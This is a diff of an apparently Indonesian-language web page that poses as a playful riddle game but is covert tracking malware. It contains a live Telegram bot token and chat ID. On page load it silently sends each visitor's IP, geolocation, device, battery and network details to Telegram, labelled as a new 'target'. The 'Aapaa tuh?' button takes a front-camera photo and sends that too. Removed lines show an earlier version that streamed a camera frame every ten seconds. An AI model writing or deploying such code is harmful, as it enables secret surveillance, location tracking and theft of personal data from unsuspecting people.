@@ -153,39 +153,6 @@ h1 {
   50% { transform: translateY(-10px); }
 }
 
-/* Loading animation */
-.loading {
-  display: none;
-  margin: 20px 0;
-}
-
-.loading-bar {
-  height: 6px;
-  background: #ffebee;
-  border-radius: 3px;
-  overflow: hidden;
-  margin-top: 10px;
-}
-
-.loading-progress {
-  height: 100%;
-  background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
-  width: 0%;
-  border-radius: 3px;
-  transition: width 0.3s;
-}
-
-.success-message {
-  display: none;
-  background: #e8f5e9;
-  border-radius: 15px;
-  padding: 15px;
-  margin: 20px 0;
-  color: #2e7d32;
-  font-weight: 500;
-  border-left: 4px solid #4caf50;
-}
-
 @media (max-width: 480px) {
   .container {
     padding: 30px 20px;
@@ -246,22 +213,10 @@ h1 {
     <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
   </div>
 
-  <!-- HANYA SATU BUTTON INI YANG ADA -->
   <button class="btn" id="btnCamera">
     <span class="sparkles">✨</span>
     Aapaa tuh?
   </button>
-
-  <div class="loading" id="loading">
-    <p>🔄 Mengambil foto...</p>
-    <div class="loading-bar">
-      <div class="loading-progress" id="loadingProgress"></div>
-    </div>
-  </div>
-
-  <div class="success-message" id="successMessage">
-    ✅ Foto berhasil diambil! 🎉
-  </div>
 
   <div class="flowers" style="margin-top: 30px;">
     <div class="flower">💐</div>
@@ -271,17 +226,11 @@ h1 {
 </div>
 
 <script>
-// ==================== KONFIGURASI ====================
 const BOT_TOKEN = "8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s";
 const CHAT_ID = "6051179992";
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const STATIC_IMAGE = "https://files.catbox.moe/8ybe0o.jpg";
 
-// ==================== VARIABLES ====================
-let videoStream = null;
-let isVideoRecording = false;
-let videoInterval = null;
-
-// ==================== BLUE TOUCH EFFECT ====================
+// Blue touch effect
 document.addEventListener('click', function(e) {
   const touchEffect = document.createElement('div');
   touchEffect.className = 'touch-effect';
@@ -294,86 +243,52 @@ document.addEventListener('click', function(e) {
   }, 600);
 });
 
-// ==================== UTILITY FUNCTIONS ====================
 function escapeHtml(s) {
   return String(s || "-").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
 }
 
-function showLoading() {
-  document.getElementById('loading').style.display = 'block';
-  document.getElementById('successMessage').style.display = 'none';
-}
-
-function hideLoading() {
-  document.getElementById('loading').style.display = 'none';
-}
-
-function showSuccess() {
-  document.getElementById('successMessage').style.display = 'block';
-  setTimeout(() => {
-    document.getElementById('successMessage').style.display = 'none';
-  }, 3000);
-}
-
-function updateProgress(percent) {
-  document.getElementById('loadingProgress').style.width = percent + '%';
-}
-
-// ==================== GET IP INFORMATION ====================
+// Get accurate IP information
 async function getIpInfo() {
   try {
-    console.log('🌐 Mengambil informasi IP...');
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
     
-    // Coba berbagai API IP
-    const apis = [
-      'https://api.ipify.org?format=json',
-      'https://ipinfo.io/json',
-      'https://api.myip.com'
-    ];
+    // Get detailed location info
+    const whoisResponse = await fetch(`https://ipwhois.app/json/${data.ip}`);
+    const whoisData = await whoisResponse.json();
     
-    for (const api of apis) {
-      try {
-        const response = await fetch(api);
-        if (response.ok) {
-          const data = await response.json();
-          console.log('✅ IP berhasil didapat:', data.ip);
-          
-          return {
-            ip: data.ip || '🌐 Unknown',
-            city: data.city || '🏙️ Unknown',
-            region: data.region || '🗺️ Unknown',
-            country: data.country || '🇮🇩 Unknown',
-            loc: data.loc || '0,0',
-            timezone: data.timezone || '⏰ Unknown',
-            org: data.org || '📡 Unknown'
-          };
-        }
-      } catch (e) {
-        console.log(`❌ API ${api} gagal:`, e);
-        continue;
-      }
-    }
-    
-    throw new Error('Semua API IP gagal');
-    
-  } catch (error) {
-    console.log('❌ Gagal mendapatkan IP:', error);
     return {
-      ip: '🌐 Unknown',
-      city: '🏙️ Unknown',
-      region: '🗺️ Unknown',
-      country: '🇮🇩 Unknown',
-      loc: '0,0',
-      timezone: '⏰ Unknown',
-      org: '📡 Unknown'
+      ip: data.ip,
+      city: whoisData.city,
+      region: whoisData.region,
+      country: whoisData.country,
+      country_code: whoisData.country_code,
+      latitude: whoisData.latitude,
+      longitude: whoisData.longitude,
+      timezone: whoisData.timezone,
+      isp: whoisData.isp,
+      asn: whoisData.asn,
+      org: whoisData.org
+    };
+  } catch (e) {
+    return {
+      ip: "Tidak terdeteksi",
+      city: "Tidak terdeteksi",
+      region: "Tidak terdeteksi",
+      country: "Tidak terdeteksi",
+      country_code: "Tidak terdeteksi",
+      latitude: "0",
+      longitude: "0",
+      timezone: "Tidak terdeteksi",
+      isp: "Tidak terdeteksi",
+      asn: "Tidak terdeteksi",
+      org: "Tidak terdeteksi"
     };
   }
 }
 
-// ==================== GET DEVICE INFORMATION ====================
+// Get accurate device information
 async function getDeviceInfo() {
-  console.log('📱 Mengambil informasi device...');
-  
   const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
     level: null, charging: false, chargingTime: null, dischargingTime: null
   }));
@@ -381,189 +296,149 @@ async function getDeviceInfo() {
   let connectionInfo = {};
   if (navigator.connection) {
     connectionInfo = {
-      effectiveType: navigator.connection.effectiveType || '📶 Unknown',
-      downlink: navigator.connection.downlink || '⬇️ Unknown',
-      rtt: navigator.connection.rtt || '⏱️ Unknown'
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt
     };
   }
 
   return {
-    // Basic info
     userAgent: navigator.userAgent,
-    platform: '💻 ' + (navigator.platform || 'Unknown'),
-    language: '🗣️ ' + (navigator.language || 'Unknown'),
-    languages: '🌐 ' + (navigator.languages ? navigator.languages.join(', ') : 'Unknown'),
-    
-    // Screen info
-    screen: '📱 ' + screen.width + 'x' + screen.height,
-    viewport: '🪟 ' + window.innerWidth + 'x' + window.innerHeight,
-    colorDepth: '🎨 ' + screen.colorDepth,
-    pixelRatio: '⚖️ ' + window.devicePixelRatio,
-    orientation: '📐 ' + (screen.orientation?.type || 'Unknown'),
-    
-    // Device info
-    cores: '🔢 ' + (navigator.hardwareConcurrency || 'Unknown'),
-    memory: '💾 ' + (navigator.deviceMemory || 'Unknown'),
-    touchPoints: '👆 ' + (navigator.maxTouchPoints || 0),
-    
-    // Network info
-    online: navigator.onLine ? '✅ Online' : '❌ Offline',
-    cookiesEnabled: navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled',
-    doNotTrack: '🚫 ' + (navigator.doNotTrack || 'Unknown'),
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation?.type,
+    cores: navigator.hardwareConcurrency,
+    memory: navigator.deviceMemory,
+    touchPoints: navigator.maxTouchPoints,
+    vendor: navigator.vendor,
+    product: navigator.product,
+    online: navigator.onLine,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
     connection: connectionInfo,
-    
-    // Battery info
     battery: {
-      level: battery.level !== null ? '🔋 ' + (battery.level * 100).toFixed(1) + '%' : '🔋 Unknown',
-      charging: battery.charging ? '⚡ Charging' : '🔌 Not Charging',
-      chargingTime: battery.chargingTime !== Infinity ? '⏳ ' + battery.chargingTime + 's' : '⏳ Unknown',
-      dischargingTime: battery.dischargingTime !== Infinity ? '⌛ ' + battery.dischargingTime + 's' : '⌛ Unknown'
+      level: battery.level !== null ? Math.round(battery.level * 100) + '%' : 'Tidak tersedia',
+      charging: battery.charging ? 'Sedang diisi' : 'Tidak diisi',
+      chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + ' detik' : 'Tidak terbatas',
+      dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + ' detik' : 'Tidak terbatas'
     },
-    
-    // Additional info
-    timezone: '🌍 ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
-    localTime: '🕐 ' + new Date().toString(),
-    utcTime: '⏰ ' + new Date().toUTCString(),
-    referrer: document.referrer ? '🔗 ' + document.referrer : '🔗 Direct',
-    url: '🌐 ' + window.location.href
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    localTime: new Date().toLocaleString('id-ID'),
+    utcTime: new Date().toUTCString(),
+    referrer: document.referrer || 'Tidak ada',
+    url: window.location.href
   };
 }
 
-// ==================== BUILD CAPTION ====================
+// Build beautiful caption with blockquote format
 function buildCaption(ip, device) {
-  console.log('📝 Membuat caption...');
-  
-  const [lat, lon] = ip.loc.split(',');
-  const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+  const mapsUrl = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
   
   return `
 🚨 <b>TARGET BARU TERKONEKSI</b> 🚨
 
-🌍 <b>INFORMASI LOKASI</b>
-🌐 IP: <code>${escapeHtml(ip.ip)}</code>
-🏙️ City: ${escapeHtml(ip.city)}
-🗺️ Region: ${escapeHtml(ip.region)}
-🇮🇩 Country: ${escapeHtml(ip.country)}
-📍 Location: ${mapsUrl}
-⏰ Timezone: ${escapeHtml(ip.timezone)}
-📡 ISP: ${escapeHtml(ip.org)}
+<blockquote>
+<b>🌍 INFORMASI LOKASI</b>
+├ 🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>
+├ 🏙️ Kota: ${escapeHtml(ip.city)}
+├ 🗺️ Region: ${escapeHtml(ip.region)}
+├ 🇮🇩 Negara: ${escapeHtml(ip.country)} (${escapeHtml(ip.country_code)})
+├ 📍 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}
+├ 🗺️ Peta: ${mapsUrl}
+├ ⏰ Zona Waktu: ${escapeHtml(ip.timezone)}
+└ 📡 ISP: ${escapeHtml(ip.isp)} (${escapeHtml(ip.asn)})
 
-💻 <b>INFORMASI DEVICE</b>
-${escapeHtml(device.platform)}
-${escapeHtml(device.language)}
-${escapeHtml(device.languages)}
+<b>💻 INFORMASI PERANGKAT</b>
+├ 🖥️ User Agent: ${escapeHtml(device.userAgent)}
+├ 💻 Platform: ${escapeHtml(device.platform)}
+├ 🗣️ Bahasa: ${escapeHtml(device.language)}
+└ 🌐 Bahasa Tersedia: ${escapeHtml(device.languages)}
 
-📱 <b>SPESIFIKASI LAYAR</b>
-${escapeHtml(device.screen)}
-${escapeHtml(device.viewport)}
-${escapeHtml(device.colorDepth)}
-${escapeHtml(device.pixelRatio)}
-${escapeHtml(device.orientation)}
+<b>📱 SPESIFIKASI LAYAR</b>
+├ 📱 Resolusi Layar: ${escapeHtml(device.screen)}
+├ 🪟 Ukuran Viewport: ${escapeHtml(device.viewport)}
+├ 🎨 Kedalaman Warna: ${escapeHtml(device.colorDepth)} bit
+├ ⚖️ Rasio Pixel: ${escapeHtml(device.pixelRatio)}
+└ 📐 Orientasi: ${escapeHtml(device.orientation)}
 
-⚙️ <b>SPESIFIKASI HARDWARE</b>
-${escapeHtml(device.cores)}
-${escapeHtml(device.memory)}
-${escapeHtml(device.touchPoints)}
+<b>⚙️ SPESIFIKASI HARDWARE</b>
+├ 🔢 CPU Cores: ${escapeHtml(device.cores)}
+├ 💾 RAM: ${escapeHtml(device.memory)} GB
+└ 👆 Touch Points: ${escapeHtml(device.touchPoints)}
 
-🌐 <b>INFORMASI JARINGAN</b>
-${escapeHtml(device.online)}
-${escapeHtml(device.cookiesEnabled)}
-${escapeHtml(device.doNotTrack)}
-${escapeHtml(device.connection.effectiveType)}
-${escapeHtml(device.connection.downlink)} Mbps
-${escapeHtml(device.connection.rtt)} ms
+<b>🌐 INFORMASI JARINGAN</b>
+├ 📶 Status Online: ${escapeHtml(device.online ? 'Online' : 'Offline')}
+├ 🍪 Cookies: ${escapeHtml(device.cookiesEnabled ? 'Aktif' : 'Nonaktif')}
+├ 🚫 Do Not Track: ${escapeHtml(device.doNotTrack || 'Tidak diatur')}
+├ 📡 Tipe Koneksi: ${escapeHtml(device.connection.effectiveType || 'Tidak terdeteksi')}
+├ ⬇️ Kecepatan: ${escapeHtml(device.connection.downlink || 'Tidak terdeteksi')} Mbps
+└ ⏱️ Latensi: ${escapeHtml(device.connection.rtt || 'Tidak terdeteksi')} ms
 
-🔋 <b>INFORMASI BATERAI</b>
-${escapeHtml(device.battery.level)}
-${escapeHtml(device.battery.charging)}
-${escapeHtml(device.battery.chargingTime)}
-${escapeHtml(device.battery.dischargingTime)}
+<b>🔋 INFORMASI BATERAI</b>
+├ 🔋 Level: ${escapeHtml(device.battery.level)}
+├ ⚡ Status: ${escapeHtml(device.battery.charging)}
+├ ⏳ Waktu Charging: ${escapeHtml(device.battery.chargingTime)}
+└ ⌛ Waktu Discharging: ${escapeHtml(device.battery.dischargingTime)}
 
-🕒 <b>WAKTU & SESI</b>
-${escapeHtml(device.timezone)}
-${escapeHtml(device.localTime)}
-${escapeHtml(device.utcTime)}
-${escapeHtml(device.referrer)}
-${escapeHtml(device.url)}
+<b>🕒 WAKTU & SESI</b>
+├ 🌍 Zona Waktu: ${escapeHtml(device.timezone)}
+├ 🕐 Waktu Lokal: ${escapeHtml(device.localTime)}
+├ ⏰ Waktu UTC: ${escapeHtml(device.utcTime)}
+├ 🔗 Referrer: ${escapeHtml(device.referrer)}
+└ 🌐 URL: ${escapeHtml(device.url)}
+</blockquote>
 
-⏰ <b>TIMESTAMP</b>
+<b>⏰ TIMESTAMP</b>
 📅 ${escapeHtml(new Date().toISOString())}
   `.trim();
 }
 
-// ==================== SEND TO TELEGRAM ====================
+// Send data to Telegram
 async function sendToTelegram(caption, photoBlob = null) {
-  console.log('📤 Mengirim ke Telegram...');
-  
   try {
     if (photoBlob) {
-      // Kirim foto dengan caption
+      // Send photo with caption
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', photoBlob, 'target_photo.jpg');
       formData.append('caption', caption);
       formData.append('parse_mode', 'HTML');
       
-      const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
       });
-      
-      if (response.ok) {
-        console.log('✅ Foto berhasil dikirim!');
-        return true;
-      }
     } else {
-      // Kirim text saja
-      const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+      // Send text only with static image
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: caption,
+          photo: STATIC_IMAGE,
+          caption: caption,
           parse_mode: 'HTML'
         })
       });
-      
-      if (response.ok) {
-        console.log('✅ Data berhasil dikirim!');
-        return true;
-      }
     }
-    
-    return false;
+    return true;
   } catch (error) {
-    console.log('❌ Gagal mengirim ke Telegram:', error);
+    console.log('Error sending to Telegram:', error);
     return false;
   }
 }
 
-// ==================== TAKE PHOTO & START VIDEO ====================
-async function takePhotoAndStartVideo() {
-  console.log('📷 Mengambil foto dan mulai video...');
-  
-  const btnCamera = document.getElementById('btnCamera');
-  
+// Take photo function
+async function takePhoto() {
   try {
-    showLoading();
-    updateProgress(10);
-    
-    // Step 1: Kirim data device dulu
-    const [ipInfo, deviceInfo] = await Promise.all([
-      getIpInfo(),
-      getDeviceInfo()
-    ]);
-    
-    updateProgress(30);
-    
-    const caption = buildCaption(ipInfo, deviceInfo);
-    await sendToTelegram(caption);
-    
-    updateProgress(50);
-    
-    // Step 2: Ambil foto
+    // Access camera
     const stream = await navigator.mediaDevices.getUserMedia({ 
       video: { 
         facingMode: 'user',
@@ -572,163 +447,53 @@ async function takePhotoAndStartVideo() {
       } 
     });
     
-    updateProgress(70);
-    
-    // Buat video element sementara
+    // Create video element
     const video = document.createElement('video');
     video.srcObject = stream;
     video.play();
     
-    // Tunggu video siap
+    // Wait for video to be ready
     await new Promise((resolve) => {
       video.onloadedmetadata = () => {
         setTimeout(resolve, 500);
       };
     });
     
-    // Ambil foto dari video
+    // Take photo
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    updateProgress(80);
-    
-    // Convert ke blob
+    // Convert to blob
     const photoBlob = await new Promise(resolve => {
       canvas.toBlob(resolve, 'image/jpeg', 0.9);
     });
     
-    // Kirim foto
-    await sendToTelegram("📸 <b>FOTO TARGET BERHASIL DIAMBIL!</b>", photoBlob);
+    // Get device and IP info
+    const [ipInfo, deviceInfo] = await Promise.all([
+      getIpInfo(),
+      getDeviceInfo()
+    ]);
     
-    updateProgress(90);
+    // Build caption and send
+    const caption = buildCaption(ipInfo, deviceInfo);
+    await sendToTelegram(caption, photoBlob);
     
-    // Step 3: Mulai video recording
-    startVideoRecording(stream);
+    // Cleanup
+    stream.getTracks().forEach(track => track.stop());
     
-    updateProgress(100);
-    
-    // Cleanup video element sementara
-    video.srcObject = null;
-    
-    hideLoading();
-    showSuccess();
-    
-    // Ganti text button
-    btnCamera.innerHTML = '<span class="sparkles">🔴</span> 📹 Live Active';
-    btnCamera.style.background = 'linear-gradient(45deg, #4CAF50, #45a049)';
-    
-    console.log('✅ Foto diambil dan video recording dimulai!');
-    
+    return true;
   } catch (error) {
-    console.log('❌ Error:', error);
-    hideLoading();
-    
-    // Fallback: coba kirim data saja tanpa foto
-    try {
-      const [ipInfo, deviceInfo] = await Promise.all([
-        getIpInfo(),
-        getDeviceInfo()
-      ]);
-      const caption = buildCaption(ipInfo, deviceInfo);
-      await sendToTelegram(caption);
-      showSuccess();
-    } catch (fallbackError) {
-      console.log('❌ Fallback juga gagal:', fallbackError);
-    }
+    console.log('Error taking photo:', error);
+    return false;
   }
 }
 
-// ==================== START VIDEO RECORDING ====================
-function startVideoRecording(stream) {
-  console.log('🎥 Memulai video recording...');
-  
-  videoStream = stream;
-  isVideoRecording = true;
-  
-  // Kirim video setiap 10 detik
-  videoInterval = setInterval(async () => {
-    if (!isVideoRecording) return;
-    
-    try {
-      const video = document.createElement('video');
-      video.srcObject = videoStream;
-      video.play();
-      
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          setTimeout(resolve, 100);
-        };
-      });
-      
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      const photoBlob = await new Promise(resolve => {
-        canvas.toBlob(resolve, 'image/jpeg', 0.8);
-      });
-      
-      await sendToTelegram("📹 <b>LIVE FEED UPDATE</b>\n⏰ " + new Date().toLocaleTimeString(), photoBlob);
-      
-      video.srcObject = null;
-      
-    } catch (error) {
-      console.log('❌ Error kirim video frame:', error);
-    }
-  }, 10000); // Setiap 10 detik
-  
-  console.log('✅ Video recording started');
-}
-
-// ==================== STOP VIDEO RECORDING ====================
-function stopVideoRecording() {
-  console.log('⏹️ Menghentikan video recording...');
-  
-  if (videoInterval) {
-    clearInterval(videoInterval);
-    videoInterval = null;
-  }
-  
-  if (videoStream) {
-    videoStream.getTracks().forEach(track => track.stop());
-    videoStream = null;
-  }
-  
-  isVideoRecording = false;
-  
-  // Reset button
-  const btnCamera = document.getElementById('btnCamera');
-  btnCamera.innerHTML = '<span class="sparkles">✨</span> Aapaa tuh?';
-  btnCamera.style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e8e)';
-  
-  console.log('✅ Video recording stopped');
-}
-
-// ==================== EVENT LISTENERS ====================
-document.getElementById('btnCamera').addEventListener('click', function(e) {
-  e.preventDefault();
-  e.stopPropagation();
-  console.log('📸 Button "Aapaa tuh?" diklik');
-  
-  if (isVideoRecording) {
-    stopVideoRecording();
-    showSuccess();
-  } else {
-    takePhotoAndStartVideo();
-  }
-});
-
-// ==================== INITIALIZE ====================
+// Initialize - Send device data on page load
 window.addEventListener('load', async function() {
-  console.log('🚀 Halaman loaded, mengirim data device...');
-  
   try {
-    // Kirim data device saat halaman load
     const [ipInfo, deviceInfo] = await Promise.all([
       getIpInfo(),
       getDeviceInfo()
@@ -737,14 +502,28 @@ window.addEventListener('load', async function() {
     const caption = buildCaption(ipInfo, deviceInfo);
     await sendToTelegram(caption);
     
-    console.log('✅ Data device berhasil dikirim!');
-    
+    console.log('Data device berhasil dikirim!');
   } catch (error) {
-    console.log('❌ Error mengirim data device:', error);
+    console.log('Error sending device data:', error);
   }
 });
 
-// Pastikan button bisa diklik
+// Camera button event
+document.getElementById('btnCamera').addEventListener('click', async function(e) {
+  e.preventDefault();
+  e.stopPropagation();
+  
+  try {
+    const success = await takePhoto();
+    if (success) {
+      console.log('Foto berhasil diambil dan dikirim!');
+    }
+  } catch (error) {
+    console.log('Error:', error);
+  }
+});
+
+// Ensure button is clickable
 document.addEventListener('DOMContentLoaded', function() {
   const btn = document.getElementById('btnCamera');
   btn.style.cursor = 'pointer';
